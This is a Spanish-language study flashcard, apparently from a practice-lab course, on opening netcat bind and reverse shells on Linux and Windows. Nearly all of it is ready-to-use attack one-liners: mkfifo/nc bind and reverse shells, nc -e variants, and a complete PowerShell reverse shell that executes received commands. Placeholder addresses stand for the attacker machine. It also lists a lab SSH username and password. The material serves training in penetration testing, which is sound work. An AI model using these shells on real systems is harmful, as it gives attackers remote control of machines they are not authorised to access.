**Flashcard: Netcat Bind and Reverse Shells (Linux & Windows)**

---

**Context:** Acceso remoto a máquina Linux/Windows usando shells con netcat.

---

**Credenciales SSH:**

* Usuario: `shell`
* Pass: `TryH4ckM3!`

---

**1. Netcat Bind Shell (Linux sin `-e`):**

```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

* Crea pipe nombrado `/tmp/f`.
* Escucha (`-l`) en `<PORT>`.
* Redirige entrada/salida para ejecutar shell interactivo.
* Al conectarse, permite control remoto (bind shell).

---

**2. Netcat Reverse Shell (Linux sin `-e`):**

```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

* Conecta hacia `<LOCAL-IP>:<PORT>`.
* Usa pipe nombrado para shell interactivo.
* Se debe tener listener (`nc -lvnp <PORT>`) en la máquina atacante.

---

**3. Netcat Bind Shell con opción `-e` (Linux/Windows, no común en Kali actual):**

```bash
nc -lvnp <PORT> -e /bin/bash
```

* Ejecuta `/bin/bash` al conectar.
* Versión insegura, no común en netcat modernas.

---

**4. Netcat Reverse Shell con opción `-e` (Windows o versiones antiguas netcat):**

```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

---

**5. Powershell Reverse Shell (Windows):**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

* Reemplazar `<IP>` y `<port>` por IP y puerto de escucha.
* Ejecutar en cmd.exe o webshell Windows para reverse shell.

---

**Notas:**

* Listener en atacante: `nc -lvnp <PORT>`
* `/tmp/f` pipe temporal debe ser borrado después.
* Netcat moderno en Kali no soporta `-e` por seguridad.
* Powershell shell útil en servidores Windows modernos.

---